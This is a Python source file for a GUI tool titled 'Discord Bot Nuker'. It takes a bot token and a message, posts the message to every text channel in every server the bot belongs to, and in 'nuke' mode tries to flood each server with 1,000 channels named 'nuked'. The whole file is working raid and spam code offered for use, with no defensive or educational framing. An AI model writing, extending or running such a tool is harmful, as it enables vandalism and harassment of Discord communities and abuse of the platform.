import discord
from discord.ext import commands
import tkinter as tk
from threading import Thread
import asyncio

intents = discord.Intents.default()
intents.members = True  # Enable the privileged members intent

bot = commands.Bot(command_prefix='!', intents=intents)

class BotApp:
    def __init__(self, master):
        self.master = master
        self.master.title("Discord Bot Nuker")
        
        self.token_label = tk.Label(master, text="Bot Token:")
        self.token_label.pack()
        
        self.token_entry = tk.Entry(master, width=50)
        self.token_entry.pack()
        
        self.message_label = tk.Label(master, text="Message to send:")
        self.message_label.pack()
        
        self.message_entry = tk.Entry(master, width=50)
        self.message_entry.pack()
        
        self.nuke_button = tk.Button(master, text="Nuke", command=self.nuke)
        self.nuke_button.pack()
        
        self.spam_button = tk.Button(master, text="Spam", command=self.spam)
        self.spam_button.pack()
        
    def nuke(self):
        token = self.token_entry.get()
        message = self.message_entry.get()
        loop = asyncio.get_event_loop()
        loop.create_task(self.start_bot(token, message, mode='nuke'))
        Thread(target=loop.run_forever).start()
    
    def spam(self):
        token = self.token_entry.get()
        message = self.message_entry.get()
        loop = asyncio.get_event_loop()
        loop.create_task(self.start_bot(token, message, mode='spam'))
        Thread(target=loop.run_forever).start()
    
    async def start_bot(self, token, message, mode):
        @bot.event
        async def on_ready():
            print(f'Bot is ready. Logged in as {bot.user}')
            for guild in bot.guilds:
                for channel in guild.text_channels:
                    try:
                        await channel.send(message)
                    except:
                        pass
                if mode == 'nuke':
                    for i in range(1000):
                        try:
                            await guild.create_text_channel(name='nuked')
                        except:
                            pass
        await bot.start(token)

root = tk.Tk()
app = BotApp(root)
root.mainloop()

